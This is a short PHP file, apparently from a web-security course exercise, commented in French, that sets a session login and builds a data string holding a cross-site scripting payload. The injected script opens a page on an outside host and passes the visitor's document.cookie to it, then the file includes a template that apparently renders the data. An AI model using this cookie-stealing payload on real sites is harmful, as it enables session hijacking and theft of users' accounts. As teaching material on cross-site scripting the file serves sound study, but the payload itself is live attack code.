<?php 
// Récupération de données infectées

session_start();
$_SESSION['login'] = 'knolls';
$data = 'Données infectées<script>window.open("http://quentin.greta/perso/mudule2/php/xss/hacker/attack_xss.php?c=" + document.cookie,"_blanck")</script>';

include 'index.phtml';
